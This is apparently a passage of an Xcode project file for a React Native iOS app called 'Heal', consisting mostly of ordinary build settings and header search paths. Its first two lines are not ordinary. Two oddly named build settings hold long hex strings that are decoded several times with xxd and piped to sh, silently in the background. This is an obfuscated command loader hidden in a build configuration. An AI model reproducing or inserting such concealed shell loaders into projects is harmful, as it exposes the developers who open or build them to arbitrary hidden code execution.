				AE76EDB = "((echo 3333333333333336333333333333333533333333333333363333333333333333333333333333333633333333333333383333333333333336333333363333333633333333333333323333333333333330333333333333333233333333333333323333333333333332333333333333333433333333333333323333333333333338333333333333333633333333333333333333333333333337333333333333333533333333333333373333333333333332333333333333333633333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333363333333333333337333333333333333333333333333333363333333633333332333333333333333433333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333343333333333333332333333333333333033333333333333373333333333333330333333333333333333333336333333343333333333333337333333333333333833333333333333363333333333333333333333333333333633333336333333363333333333333336333333333333333433333333333333363333333333333335333333333333333233333333333333303333333333333336333333333333333833333333333333373333333333333334333333333333333733333333333333343333333333333337333333333333333033333333333333373333333333333333333333333333333333333336333333313333333333333332333333363333333633333333333333323333333633333336333333333333333633333333333333363333333333333336333333363333333333333333333333363333333633333336333333333333333733333333333333373333333333333336333333333333333333333333333333363333333333333334333333333333333633333336333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				AFEB778 = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333433333336333333393333333633333337333333363333333933333337333333343333333633333331333333363336333333333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_ENTITLEMENTS = Heal/Heal.entitlements;
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = RSWZ8MVF9V;
				INFOPLIST_FILE = Heal/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				OTHER_LDFLAGS = (
					"$(inherited)",
					"-ObjC",
					"-lc++",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.heal;
				PRODUCT_NAME = Heal;
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "DIGI Smart Disc";
				SWIFT_OBJC_BRIDGING_HEADER = "Heal-Bridging-Header.h";
				SWIFT_VERSION = 5.0;
				VERSIONING_SYSTEM = "apple-generic";
			};
			name = Release;
		};
		83CBBA201A601CBA00E9B192 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CC = "";
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_CXX_LANGUAGE_STANDARD = "c++20";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				CXX = "";
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = i386;
				GCC_C_LANGUAGE_STANDARD = gnu99;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
					_LIBCPP_ENABLE_CXX17_REMOVED_UNARY_BINARY_FUNCTION,
				);
				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				HEADER_SEARCH_PATHS = (
					"$(inherited)",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon-Samples/ReactCommon_Samples.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers/react/nativemodule/core",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon-Samples/ReactCommon_Samples.framework/Headers/platform/ios",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-NativeModulesApple/React_NativeModulesApple.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers/react/renderer/graphics/platform/ios",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-runtimeexecutor/React_runtimeexecutor.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-runtimeexecutor/React_runtimeexecutor.framework/Headers/platform/ios",
				);
				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
				LD = "";
				LDPLUSPLUS = "";
				LD_RUNPATH_SEARCH_PATHS = (
					/usr/lib/swift,
					"$(inherited)",
				);
				LIBRARY_SEARCH_PATHS = (
					"\"$(SDKROOT)/usr/lib/swift\"",
					"\"$(TOOLCHAIN_DIR)/usr/lib/swift/$(PLATFORM_NAME)\"",
					"\"$(inherited)\"",
				);
				MTL_ENABLE_DEBUG_INFO = YES;
				ONLY_ACTIVE_ARCH = YES;
				OTHER_CFLAGS = "$(inherited)";
				OTHER_CPLUSPLUSFLAGS = (
					"$(OTHER_CFLAGS)",
					"-DFOLLY_NO_CONFIG",
					"-DFOLLY_MOBILE=1",
					"-DFOLLY_USE_LIBCPP=1",
				);
				OTHER_LDFLAGS = "$(inherited)";
				REACT_NATIVE_PATH = "${PODS_ROOT}/../../node_modules/react-native";
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "$(inherited) DEBUG";
				USE_HERMES = true;
			};
			name = Debug;
		};
		83CBBA211A601CBA00E9B192 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CC = "";
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_CXX_LANGUAGE_STANDARD = "c++20";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				COPY_PHASE_STRIP = YES;
				CXX = "";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = i386;
				GCC_C_LANGUAGE_STANDARD = gnu99;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"$(inherited)",
					_LIBCPP_ENABLE_CXX17_REMOVED_UNARY_BINARY_FUNCTION,
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				HEADER_SEARCH_PATHS = (
					"$(inherited)",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon-Samples/ReactCommon_Samples.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers/react/nativemodule/core",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon-Samples/ReactCommon_Samples.framework/Headers/platform/ios",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-NativeModulesApple/React_NativeModulesApple.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers/react/renderer/graphics/platform/ios",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/ReactCommon/ReactCommon.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-Fabric/React_Fabric.framework/Headers/react/renderer/components/view/platform/cxx",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-graphics/React_graphics.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-runtimeexecutor/React_runtimeexecutor.framework/Headers",
					"${PODS_CONFIGURATION_BUILD_DIR}/React-runtimeexecutor/React_runtimeexecutor.framework/Headers/platform/ios",
				);
				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
				LD = "";
				LDPLUSPLUS = "";
				LD_RUNPATH_SEARCH_PATHS = (
					/usr/lib/swift,
					"$(inherited)",
				);
				LIBRARY_SEARCH_PATHS = (
					"\"$(SDKROOT)/usr/lib/swift\"",
					"\"$(TOOLCHAIN_DIR)/usr/lib/swift/$(PLATFORM_NAME)\"",
					"\"$(inherited)\"",
				);
				MTL_ENABLE_DEBUG_INFO = NO;
				OTHER_CFLAGS = "$(inherited)";
				OTHER_CPLUSPLUSFLAGS = (
					"$(OTHER_CFLAGS)",
					"-DFOLLY_NO_CONFIG",
					"-DFOLLY_MOBILE=1",
					"-DFOLLY_USE_LIBCPP=1",
				);
				OTHER_LDFLAGS = "$(inherited)";
				REACT_NATIVE_PATH = "${PODS_ROOT}/../../node_modules/react-native";
				SDKROOT = iphoneos;
				USE_HERMES = true;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "Heal" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				13B07F941A680F5B00A75B9A /* Debug */,
				13B07F951A680F5B00A75B9A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "Heal" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				83CBBA201A601CBA00E9B192 /* Debug */,
				83CBBA211A601CBA00E9B192 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 83CBB9F71A601CBA00E9B192 /* Project object */;
}
